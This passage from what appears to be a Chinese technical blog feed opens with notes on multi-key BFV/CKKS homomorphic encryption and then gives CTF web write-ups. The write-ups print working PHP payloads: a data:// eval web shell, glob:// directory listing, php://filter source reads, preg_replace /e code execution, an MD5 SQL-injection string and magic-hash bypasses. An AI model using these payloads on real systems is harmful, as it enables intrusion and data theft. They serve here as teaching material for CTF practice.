inline">\(\overline{ct}_{i}^{*}=(c_{0}^{*},c_{1}^{*},...,c_{k}^{*})∈R_{q}^{k+1}\)</span>，其中<span class="math inline">\(c_{0}^{*}=c_{0},c_{i}^{*}=\left\{\begin{aligned}  c_{j}\ \ \ if\ i=id_{j}\ for\ some\ 1\le{j}\le{k}\\  0\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ otherwise \end{aligned}\right.\)</span>。我们注意到，<span class="math inline">\(&lt;\overline{ct}_{i},(1,s_{id_{1}},...,s_{id_{k_{i}}})&gt;=&lt;\overline{ct}^{*},(1,s_{1},...,s_{k})&gt;\)</span>。为简单起见，我们将假设此预处理总是在同态运算之前完成，以便两个输入密文与k个参与方的同一集合相关。<br></p><p><strong>安全性和正确性</strong>：我们记得，在参数<span class="math inline">\((n,q,\chi,\psi)\)</span>的RLWE假设下，BFV和CKKS是IND-CPA安全的。我们的MKHE方案具有完全相同的单密钥加密算法，因此它们的安全性依赖于同一RLWE问题的难度（细节参见附录B）。本节中我们将简单展示我们方案的正确性，噪音分析的严格证明将在附录C中提供。</p><h2 id="多密钥bfv">4.1 多密钥BFV</h2><p>  BFV方案是一种大小不变的HE，它支持在具有有限特征的离散空间上进行精确计算。我们用t来表示明文模数，<span class="math inline">\(\Delta=\lfloor{q/t}\rceil\)</span>表示BFV方案的比例因子。原始明文空间是分圆多项式<span class="math inline">\(R_{t}\)</span>的集合，但是，根据t和n的关系，明文通过<span class="math inline">\(R_{t}\)</span>的环同构被解码为有限域元素的元组。<br></p><ul><li><span class="math inline">\(MK-BFV.Enc(m;b,\mathrm{a})\)</span>：这是标准的BFV加密，以多项式<span class="math inline">\(m∈R_{t}\)</span>为输入。设<span class="math inline">\(a=\mathrm{a}[0],b=b[0]\)</span>。采样<span class="math inline">\(v\gets\chi\)</span>和<span class="math inline">\(e_{0},e_{1}\gets\psi\)</span>。返回密文<span class="math inline">\(ct=(c_{0},c_{1})∈R_{q}^{2}\)</span>，其中<span class="math inline">\(c_{0}=v·b+\Delta·m+e_{0}\ (mod\ q),c_{1}=v·a+e_{1}\ (mod\ q)\)</span>.</li><li><span class="math inline">\(MK-BFV.Dec(\overline{ct};s_{1},...,s_{k})\)</span>：设<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q}^{k+1}}\)</span>是与k方相关联的密文，<span class="math inline">\(s_{1},...,s_{k}\)</span>是他们的私钥。设置<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>并计算<span class="math inline">\(\lfloor{(t/q)·&lt;\overline{ct},\overline{sk}&gt;}\rceil\ (mod\ t)\)</span>.</li><li><span class="math inline">\(MK-BFV.Add(\overline{ct}_{1},\overline{ct}_{2})\)</span>：给定两个密文<span class="math inline">\(\overline{ct}_{i}\in{R_{q}^{k+1}}\)</span>，返回密文<span class="math inline">\(\overline{ct}&#39;=\overline{ct}_{1}+\overline{ct}_{2}\ (mod\ q)\)</span>.</li><li><span class="math inline">\(MK-BFV.Mult(\overline{ct}_{1},\overline{ct}_{2};{\{(D_{i},b_{i})\}}_{1\le{i}\le{k}})\)</span>：给定两个密文<span class="math inline">\(\overline{ct}_{i}\in{R_{q}^{k+1}}\)</span>，计算<span class="math inline">\(\overline{ct}=\lfloor{(t/q)·(\overline{ct}_{1}\otimes\overline{ct}_{2})\rceil\ (mod\ q)\in{R_{q}^{(k+1)^{2}}}}\)</span>，返回密文<span class="math inline">\(\overline{ct}&#39;\gets{Relin(\overline{ct};\{(D_{i},b_{i})\}_{1&lt;i&lt;k})}\)</span>.<br></li></ul><p>  我们方案的正确性是从基本BFV和重新线性化算法的性质得到的。<span class="math inline">\(m\in{R_{t}}\)</span>的一个多密钥BFV加密是一个向量<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q}^{k+1}}\)</span>，从而对于私钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>有<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;\approx\Delta·m\ (mod\ q)\)</span>。因此解密算法能够正确回复m。如果<span class="math inline">\(\overline{ct}_{1}\)</span>和<span class="math inline">\(\overline{ct}_{2}\)</span>是<span class="math inline">\(m_{1}\)</span>和<span class="math inline">\(m_{2}\)</span>关于私钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>的加密，则它们的（标度）张量积<span class="math inline">\(\overline{ct}=\lfloor{(t/q)·(\overline{ct}_{1}\otimes\overline{ct}_{2})\rceil\ (mod\ q)}\)</span>满足<span class="math inline">\(&lt;\overline{ct},\overline{sk}\otimes\overline{sk}&gt;\approx\Delta·m_{1}m_{2}\ (mod\ q)\)</span>，与原始BFV方案类似。输出<span class="math inline">\(\overline{ct}&#39;\gets{Relin(\overline{ct};\overline{rlk})}\)</span>有<span class="math inline">\(&lt;\overline{ct}&#39;,\overline{sk}&gt;\approx&lt;\overline{ct},\overline{sk}\otimes\overline{sk}&gt;\approx\Delta·m_{1}m_{2}\ (mod\ q)\)</span>。</p><h2 id="多密钥ckks">4.2 多密钥CKKS</h2><p>  CKKS方案是一种支持近似不动点算法的分层HE方案。我们假设对于某些整数<span class="math inline">\(p_{i}\)</span>有<span class="math inline">\(\prod_{i=0}^{L}{p_{i}}\)</span>，存在一个密文模链<span class="math inline">\(q_{0}&lt;q_{1}&lt;...&lt;q_{L},q_{\iota}=\prod_{i=0}^{\iota}{p_{i}}\)</span>。原始明文是一个小多项式<span class="math inline">\(m\in{R}\)</span>，但通过DFT，一个多项式最多可以包含(n/2)个复数。除了基本的算数运算之外，它还支持重缩放算法来控制加密信息的大小。对于不同层次间密文的同态运算，它需要将一个高层次的密文转换为与另一个密文相同的层次。<br></p><ul><li><span class="math inline">\(MK-CKKS.Enc(m;b,a)\)</span>：设<span class="math inline">\(m∈R\)</span>是一个输入明文，<span class="math inline">\(a=\mathrm{a}[0],b=b[0]\)</span>。采样<span class="math inline">\(v\gets\chi\)</span>和<span class="math inline">\(e_{0},e_{1}\gets\psi\)</span>。返回密文<span class="math inline">\(ct=(c_{0},c_{1})∈R_{q}^{2}\)</span>，其中<span class="math inline">\(c_{0}=v·b+m+e_{0}\ (mod\ q),c_{1}=v·a+e_{1}\ (mod\ q)\)</span>.</li><li><span class="math inline">\(MK-CKKS.Dec(\overline{ct};s_{1},...,s_{k})\)</span>：设<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q_{\iota}}^{k+1}}\)</span>是层次为<span class="math inline">\(\iota\)</span>的与k方相关联的密文，<span class="math inline">\(s_{1},...,s_{k}\)</span>是它们的私钥。设置<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>并返回<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;\ (mod\ q_{\iota})\)</span>.</li><li><span class="math inline">\(MK-CKKS.Add(\overline{ct}_{1},\overline{ct}_{2})\)</span>：给定两个<span class="math inline">\(\iota\)</span>层的密文<span class="math inline">\(\overline{ct}_{i}\in{R_{q}^{k+1}}\)</span>，返回密文<span class="math inline">\(\overline{ct}&#39;=\overline{ct}_{1}+\overline{ct}_{2}\ (mod\ q_{\iota})\)</span>.</li><li><span class="math inline">\(MK-CKKS.Mult(\overline{ct}_{1},\overline{ct}_{2};{\{(D_{i},b_{i})\}}_{1\le{i}\le{k}})\)</span>：给定两个<span class="math inline">\(\iota\)</span>层的密文<span class="math inline">\(\overline{ct}_{i}\in{R_{q}^{k+1}}\)</span>，计算<span class="math inline">\(c_{i}&#39;=\lfloor{p_{\iota}^{-1}·c_{i}\rceil,0\le{i}\le{k},}\)</span>并返回密文<span class="math inline">\(\overline{ct}&#39;=(c_{0}&#39;,c_{1}&#39;,...,c_{k}&#39;)\in{R_{q_{\iota-1}}^{k+1}}\)</span>.</li></ul><p>  明文m的一个与私钥<span class="math inline">\(\overline{sk}=(1,s_{1},...,s_{k})\)</span>相关联的<span class="math inline">\(\iota\)</span>层多密钥加密是一个向量<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q_{\iota}}^{k+1}}\)</span>，满足<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;\approx{m}\ (mod\ q_{\iota})\)</span>。对于基础同态操作，我们以<span class="math inline">\(m_{1}\)</span>和<span class="math inline">\(m_{2}\)</span>的<span class="math inline">\(\iota\)</span>层加密作为输入。然后同态加法（乘法）返回一个密文<span class="math inline">\(\overline{ct}&#39;\)</span>，使得<span class="math inline">\([&lt;\overline{ct}&#39;,\overline{sk}&gt;]_{q_{\iota}}\)</span>与<span class="math inline">\(m_{1}+m_{2}\ (m_{1}m_{2})\)</span>近似相等。最后，我们展示了对于m的一个<span class="math inline">\(\iota\)</span>层加密<span class="math inline">\(\overline{ct}\)</span>，重缩放算法从公式<span class="math inline">\([&lt;\overline{ct}&#39;,\overline{sk}&gt;]_{q_{\iota-1}}\approx{p_{\iota}^{-1}}·[&lt;\overline{ct},\overline{sk}&gt;]_{q_{\iota}}\)</span>中返回加密了<span class="math inline">\(p_{\iota}^{-1}·m\)</span>的一个<span class="math inline">\((\iota-1)\)</span>层密文<span class="math inline">\(\overline{ct}&#39;\)</span>。</p><h2 id="分布式解密">4.3 分布式解密</h2><p>  在MKHE原本的经典定义中，解密多密钥密文需要涉及所有参与方的密钥。但是实际上，假设有一方持有多个私钥是不合理的。相反，我们可以考虑多个密钥持有者之间的协议来共同解密一个密文。我们方案的解密算法是已知系数的私钥的（近似）线性组合，且已经提出了一些用于此任务的安全方法。我们介绍了一种基于噪声淹没技术的简单解决方案，但可以使用任意实现相同功能的安全解决方案。<br></p><p>  分布式解密由两个算法组成：部分解密和合并。在第一部分，每一方i接收密文的第i个条目，并带有噪音进行解密。我们设置了比基本方案的标准误差分布<span class="math inline">\(\psi\)</span>方差更大的噪声分布<span class="math inline">\(\phi\)</span>。然后我们将部分解密的结果与<span class="math inline">\(c_{0}\)</span>合并以恢复信息。</p><ul><li><span class="math inline">\(MKHE.PartDec(c_{i},s_{i})\)</span>：给定一个多项式<span class="math inline">\(c_{i}\)</span>和一个秘密<span class="math inline">\(s_{i}\)</span>，采样误差<span class="math inline">\(e_{i}\gets{\phi}\)</span>并返回<span class="math inline">\(\mu_{i}=c_{i}·s_{i}+e_{i}\ (mod\ q)\)</span>.</li><li><span class="math inline">\(MK-BFV.Merge(c_{0},\{\mu_{i}\}_{1\le{i}\le{k}})\)</span>：计算<span class="math inline">\(\mu=c_{0}+\sum_{i=1}^{k}{\mu_{i}}\ (mod\ q)\)</span>并返回<span class="math inline">\(m=\lfloor{(t/q)·\mu\rceil}\)</span>.</li><li><span class="math inline">\(MK-CKKS.Merge(c_{0},\{\mu_{i}\}_{1\le{i}\le{k}})\)</span>：计算并返回<span class="math inline">\(\mu=c_{0}+\sum_{i=1}^{k}{\mu_{i}}\ (mod\ q)\)</span>.</li></ul><p>  对于一个多密钥密文<span class="math inline">\(\overline{ct}=(c_{0},...,c_{k})\)</span>，多密钥BFV和CKKS方案都在合并阶段计算<span class="math inline">\(\mu=c_{0}+\sum_{i=1}^{k}{\mu_{i}}=&lt;\overline{ct},\overline{sk}&gt;+\sum_{i=1}^{k}{e_{i}}\approx&lt;\overline{ct},\overline{sk}&gt;\ (mod\ q)\)</span>。然后，BFV通过取消比例因子(q/t)来提取明文。</p><h1 id="两个mkhe方案的自举性">5. 两个MKHE方案的自举性</h1><p>  已经存在一些关于基于标准（单密钥）环的HE方案自举过程的研究。以前的工作有不同的基于基础方案的目标和解决方案，但它们基本上遵循Gentry的技术-解密电路的同态评估。特别地，BFV和CKKS方案具有非常相似的自举途径，由以下四步组成：（1）模数提升；（2）多项式系数到时隙；（3）提取和（4）时隙到多项式系数。第二步和最后一步是特定的线性变换，这需要对加密的向量进行旋转操作。<br></p><p>  在本节的其余部分，我们首先解释了如何基于Galois自同构的计算来对多密钥密文进行旋转操作。然后我们重新讨论了BFV和CKKS的自举过程，以推广MKHE方案的现有解决方案。</p><h2 id="galois自同构的同态计算">5.1 Galois自同构的同态计算</h2><p>  分圆域的Galois群<span class="math inline">\(Gal(\mathbb{Q}[X]/(X^{n}+1))\)</span>由<span class="math inline">\(X\mapsto{X^{j}},j\in{\mathbb{Z}_{2n}^{*}}\)</span>的转换组成。我们记得BFV（CKKS）使用<span class="math inline">\(R_{t}(R)\)</span>上的DFT来将多个明文值压缩到单个多项式中。这些自同构为压缩密文提供了特殊的功能，例如明文时隙的旋转。<br></p><p>  自同构的评估可以基于密钥切换技术来完成。设<span class="math inline">\(\tau_{j}:a(X)\mapsto{a(X^{j})}\)</span>是Galois群的一个元素。给定m的一个加密<span class="math inline">\(\overline{ct}=(c_{0},c_{1},...,c_{k})\in{R_{q}^{k+1}}\)</span>，我们用<span class="math inline">\(\tau_{j}(\overline{ct})=(\tau_{j}(c_{0}),...,\tau_{j}(c_{k}))\)</span>表示通过将<span class="math inline">\(\tau_{j}\)</span>取为<span class="math inline">\(\overline{ct}\)</span>条目而得到的密文。<span class="math inline">\(\tau_{j}(\overline{ct})\)</span>是<span class="math inline">\(\tau_{j}(m)\)</span>对应于私钥<span class="math inline">\(\tau_{j}(\overline{sk})\)</span>的一个有效加密。然后我们执行从<span class="math inline">\(\tau_{j}(\overline{sk})\)</span>到<span class="math inline">\(\overline{sk}\)</span>的密钥切换程序，从而生成一个新密文，在原始私钥<span class="math inline">\(\overline{sk}\)</span>下对同一信息进行加密。 接下来，我们提出了两种Galois元素的评估算法。第一个算法为Galois自同构<span class="math inline">\(\tau_{j}\)</span>生成一个评估密钥。第二个算法收集多方的评估密钥，并使用多密钥切换技术对多密钥密文上的<span class="math inline">\(\tau_{j}\)</span>进行评估。<br></p><ul><li><span class="math inline">\(MKHE.GkGen(j;s)\)</span>：生成一个随机向量<span class="math inline">\(h_{1}\gets{U(R_{q}^{d})}\)</span>和一个误差向量<span class="math inline">\(e&#39;\gets{\psi^{d}}\)</span>。对于一个RLWE秘密<span class="math inline">\(s\in{R}\)</span>，计算<span class="math inline">\(h_{0}=-s·h_{1}+e&#39;+\tau_{j}(s)·g\ (mod\ q)\)</span>。返回Galois评估密钥<span class="math inline">\(gk=[h_{0}|h_{1}]\in{R_{q}^{d×2}}\)</span>.</li><li><span class="math inline">\(MKHE.EvalGal(\overline{ct};\{gk_{i}\}_{1\le{i}\le{k}})\)</span>：设<span class="math inline">\(gk_{i}=[h_{i,0}|h_{i,1}]\)</span>是第i方（1≤i≤k）的Galois评估密钥。给定密文<span class="math inline">\(\overline{ct}=(c_{0},...,c_{k})\in{R_{q}^{k+1}}\)</span>，计算并返回密文<span class="math inline">\(\overline{ct}&#39;=(c_{0}&#39;,...,c_{k}&#39;)\)</span>，其中<span class="math inline">\(1≤i≤k,c_{0}&#39;=\tau_{j}(c_{0})+\sum_{i=1}^{k}{&lt;g^{-1}(\tau_{j}(c_{j})),h_{i,0}&gt;}\ (mod\ q),c_{i}&#39;=&lt;g^{-1}(\tau_{j}(c_{i})),h_{i,1}&gt;\ (mod\ q)\)</span></li></ul><p>  在CKKS的上下文中，所有<span class="math inline">\(\iota\)</span>层密文的计算都是在模数<span class="math inline">\(q=q_{\iota}\)</span>上进行的。现在我们展示我们算法的正确性。<br></p><p><strong>正确性</strong>：根据定义，输出密文<span class="math inline">\(\overline{ct}&#39;=(c_{0}&#39;,...,c_{k}&#39;)\gets{MKHE.EvalGal(\overline{ct};\{gk_{i}\}_{1\le{i}\le{k}})}\)</span>，有</p><p><img src="http://tva1.sinaimg.cn/large/007aD2tWly1gyfnwz8dzbj30le09ttbx.jpg" /> 换句话说，如果输入密文具有相位<span class="math inline">\(\mu(X)=&lt;\overline{ct},\overline{sk}&gt;\ (mod\ q)\)</span>，则输出密文的相位大约等同于<span class="math inline">\(\tau_{j}(\mu(X))=\mu(X^{j})\)</span>。<br></p><p>  除了明文时隙的旋转，我们使用相同的技术评估BFV密文上的Frobenius自同态<span class="math inline">\(X\mapsto{X}^{t}\)</span>。在CKKS中，映射<span class="math inline">\(X\mapsto{X}^{t}\)</span>对应于明文时隙上的复数共轭。<br></p><p>  任意线性转换都可以表示为移位明文向量的线性组合。我们注意到之前线性转换的HE优化技术能够直接应用到我们的MKHE方案中。</p><h2 id="多密钥bfv的自举性">5.2 多密钥BFV的自举性</h2><p>  Chen和Han描述了单密钥BFV方案的一个自举过程。该自举方案以具有任意噪音的密文作为输入，并输出另一个加密了相同明文的具有较小噪音的密文。下面我们介绍一个多密钥变体。<br></p><p>  （1）先前的工作公布了一个私钥本身的加密来提高模数。但是我们证明了这一步可以通过在没有额外信息的情况下乘以一个常数来完成。假设输入密文<span class="math inline">\(\overline{ct}\)</span>加密了一个明文模数为t的信息m，即<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;=\frac{q}{t}m+e\ (mod\ q)\)</span> ，e为某个误差。我们将模数转换为q的一个除数q'， 从而有<span class="math inline">\(&lt;\overline{ct}&#39;,\overline{sk}&gt;=\frac{q&#39;}{t}m+e&#39;\ (mod\ q)\)</span>，然后将密文与q/q’相乘，得到密文<span class="math inline">\(\overline{ct}&#39;&#39;\)</span>，其相位为<span class="math inline">\(&lt;\overline{ct}&#39;&#39;,\overline{sk}&gt;=\frac{q}{q&#39;}·(\frac{q&#39;}{t}m+e&#39;)\ (mod\ q)\)</span>。这是一个简单（无噪音）的<span class="math inline">\(\mu=\frac{q&#39;}{t}m+e&#39;\)</span>的加密，明文模数为q'，密文模数为q。<br></p><p>  （2）计算一个同态线性转换，该变换产生多个系数<span class="math inline">\(\mu_{i}\in\mathbb{Z}_{t}\)</span>在它们的明文时隙中的密文。我们主要到这一步可以通过加法、标量乘法和多密钥旋转来实现。<br></p><p>  （3）我们同态地评估上一步得到的多密钥密文上的一个多项式，称之为低位数字去除。它去除了噪音e'并保留了明文时隙中m的系数。<br></p><p>  （4）最后一步是另一个线性转换，它将第二步反转并输出m的一个加密。<br></p><p>  因此，对于小于初始噪音e的误差，输出密文具有相位<span class="math inline">\(\frac{q}{t}m+e&#39;&#39;\ (mod\ q)\)</span>。</p><h2 id="多密钥ckks的自举性">5.3 多密钥CKKS的自举性</h2><p>  Cheon等人提出了单密钥CKKS方案的一个自举过程。CKKS的该自举过程目的是刷新一个低层次密文，并返回在较大的密文模数中（几乎）相同信息的一个加密。如下我们描述了它的多密钥版本。<br></p><p>  （1）第一步以一个最低层次的密文<span class="math inline">\(\overline{ct}\)</span>作为输入。设<span class="math inline">\(\mu=&lt;\overline{ct},\overline{sk}&gt;\ (mod\ q_{0})\)</span>。则对于一个小的I∈R，有<span class="math inline">\(&lt;\overline{ct},\overline{sk}&gt;=q_{0}·I+\mu\)</span>，因此可认为<span class="math inline">\(\overline{ct}\)</span>是最大密文模数<span class="math inline">\(q_{\iota}\)</span>中<span class="math inline">\(t=q_{0}·I+\mu\)</span>的一个加密。<br></p><p>  （2）我们应用了一个同态线性转换来计算一个或两个加密了它们明文时隙中t(X)的系数的密文。这一步需要多密钥旋转和第5.1节中描述的共轭。<br></p><p>  （3）我们评估了一个多项式，其近似于模<span class="math inline">\(q_{0}\)</span>函数的约简。它去除了t的I部分并保留了时隙中μ的系数。<br></p><p>  （4）最后，我们应用了第二步的逆线性转换来将μ的全部系数压缩至一个密文中。<br></p><p>  输出密文<span class="math inline">\(\overline{ct}&#39;\)</span>加密了相比与输入密文<span class="math inline">\(\overline{ct}\)</span>更高层次的相同明文μ，即对某些<span class="math inline">\(0&lt;\iota&lt;L\)</span>，有<span class="math inline">\(&lt;\overline{ct}&#39;,\overline{sk}&gt;\approx\mu\ (mod\ q_{\iota})\)</span>。<br><br></p><hr /><p>  理论部分暂时就到这里了，后面的应用部分如果用得到的话就再更新吧</p><hr />]]></content>
    
    
    <categories>
      
      <category>FHE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>FHE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GXUCTF easy-伪协议</title>
    <link href="/2021/10/08/GXUCTF-easy-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/10/08/GXUCTF-easy-%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>题目直接给出了源码</p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9apna123j60r80cl75m02.jpg" /></p><p>一些新东西👇 open_basedir：将php所能打开的文件限制在指定的目录树中 pathinfo()：以数组的形式返回关于文件路径的信息(PATHINFO_DIRNAME - 只返回 dirname; PATHINFO_BASENAME - 只返回 basename; PATHINFO_EXTENSION - 只返回 extension; PATHINFO_FILENAME - 只返回 filename)</p><p>首先对$text进行了匹配，要求是字符串"how_to_bypass?"，可以利用伪协议进行写入 <code>data://text/plain,how_to_bypass?</code></p><p>继续对$file传入参数的后缀进行了检查，如果是php就进行文件包含，这里的绕过只需要在最后加一个.php就可以，很easy~</p><p>剩下的问题就是进行flag文件的读取了，现在我们是不知道flag所在文件的名称和路径的，我试着读了一下当前目录下的flag.php..失败了</p><p>这里看了大佬的博客，学到了新的知识=&gt;利用glob://伪协议进行目录遍历是可以无视open_basedir的</p><p><code>$file=data://text/plain,&lt;?php @eval($_REQUEST[1]);?&gt;.php&amp;1=var_dump(scandir('glob:///*'));</code></p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9brxnl0ej61ne0chjwk02.jpg" /></p><p>其实open_basedir对解这道题并没啥影响，flag文件就在当前目录下，所有直接用scandir('.')就能看到</p><p><img src="https://tva3.sinaimg.cn/large/007aD2tWgy1gv9brhg4dxj61l0091ace02.jpg" /></p><p>得到文件名后就可以进行读取了，可以file_get_contents直接读 <code>$file=data://text/plain,&lt;?php @eval($_REQUEST[1]);?&gt;.php&amp;1=echo file_get_contents('fll11llaaaggg.php');</code></p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c3k8uqpj60it032t8u02.jpg" /></p><p>我真的是个憨批..这里读出的flag在源码里，我还以为没读到来回搞了好久，最后去问了出题人..给自己一锤😢</p><p>或者php://filter读取</p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv9c2kzk3ij61hw096ac902.jpg" /></p><p>解码得到flag</p>]]></content>
    
    
    <categories>
      
      <category>一些杂题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF ZJCTF不过如此</title>
    <link href="/2021/10/06/BJDCTF-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
    <url>/2021/10/06/BJDCTF-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    
    <content type="html"><![CDATA[<p>直接给出源码</p><p><img src="https://tva3.sinaimg.cn/large/007aD2tWgy1gv9c9lvljyj60um0gadhl02.jpg" /></p><p>这里$text可以利用data伪协议写入，根据提示利用filter读取next.php <code>text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</code></p><p><img src="https://tvax1.sinaimg.cn/large/007aD2tWgy1gv9cciyy2ij61nz0cz41x02.jpg" /></p><p>解码得到next.php源码 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure></p><p>这里读flag肯定要通过getFlag()函数，没什么思路去看了wp，学到很多新知识</p><p>⭐preg_replace(<span class="math inline">\(pattern,\)</span>replacement,<span class="math inline">\(subject)：在\)</span>subject中匹配<span class="math inline">\(pattern，并将其替换为\)</span>replacement /e修正符，$replacement中的字符串会被当作PHP代码执行 这里就提供给我们执行命令的机会，'strtolower("\\1")'会被当做PHP代码执行</p><p>⭐正则表达式中的'\\1'，其实就是转义后的'\1'，表示取出正则匹配后的第一个子匹配中的第一项 构造payload<code>\S%2b=phpinfo();</code> 这里，+表示匹配1或更多次，+就能匹配一个完整字符串了，URL传参的话+需要进行编码，否则会被认作空格</p><p>得到'strtolower("phpinfo();")' 传参进去后发现代码并没有被执行？</p><p><img src="https://tva4.sinaimg.cn/large/007aD2tWgy1gv9cvepa7aj60yn08emya02.jpg" /></p><p>这里又涉及到一个PHP的小性质 ⭐在php中，双引号里面如果包含有变量，php解释器会进行解析；单引号中的变量不会被处理。 目前我们构造的payload最终执行时相当于=&gt;eval('strrolower("phpinfo();")');</p><p>⭐PHP可变变量<span class="math inline">\({\)</span>a} <code>\S%2b=$&#123;phpinfo()&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>BUU刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PHP伪协议</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF Easy_MD5</title>
    <link href="/2021/10/06/BJDCTF-Easy-MD5/"/>
    <url>/2021/10/06/BJDCTF-Easy-MD5/</url>
    
    <content type="html"><![CDATA[<p>1、打开是一个查询框，用burp发包看一下</p><p><img src="https://tvax4.sinaimg.cn/large/007aD2tWgy1gv5p06qjefj612208843202.jpg" /></p><p>在Response里有一句提示 <code>Hint: select * from 'admin' where password=md5($pass,true)</code></p><p>首先说明一下这个函数 👉md5(<span class="math inline">\(pass, true)：\)</span>pass是待加密字符串，第二个参数设为true，控制输出为原始16字符二进制格式</p><p>所以我们要想办法结合这个函数来进行SQL注入，这里看了大佬的wp，学习到一个类似万能密码的东东<code>ffifdyop</code></p><p>这个字符串经过md5加密后会输出一串<code>'or'6XXXXX</code>，结合查询语句 👉<code>select * from 'admin' where password = ''or'6XXXXX'</code> 后面的'6XXXXX'就等价于一个永真式，至此就绕过了md5函数，注入成功！</p><p>2、下面来到第二个界面，一句大大的Do you like MD5，那必然like..在源码里找到提示信息</p><p><img src="https://tvax3.sinaimg.cn/large/007aD2tWgy1gv5pz39fwhj60l305gmxe02.jpg" /></p><p>这里涉及到PHP的'=='弱比较漏洞，如果进行比较的两个值类型不同，PHP会首先将其化为相同类型再进行比较，在处理哈希字符串时，它会把所有以'0e'开头的哈希值都解析为0，所以这里传两个哈希后'0e'开头的字符串即可</p><p>附上一些可用字符串： * QNKCDZO * 240610708 * s878926199a * s155964671a</p><p>也附上一个弱类型比较表给大家</p><p><img src="https://tva2.sinaimg.cn/large/007aD2tWgy1gv5q4kysamj61bg0riqp702.jpg" /></p><p>3、绕过成功，来到第三个界面</p><p><img src="https://tvax1.sinaimg.cn/large/007aD2tWgy1gv5qizplz3j60tl07q3z202.jpg" /></p><p>'==='进行比较时，会判断值+类型，可以选择强碰撞或者md5数组绕过</p><p>PHP的md5()函数是无法处理数组的，在传入的参数为数组时会返回NULL，因此只需要传入两个不同值的数组，得到的结果就是'NULL === NULL'啦</p><p>强碰撞的话，这里给出几个md5值相同的字符串： <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">$s1 = <span 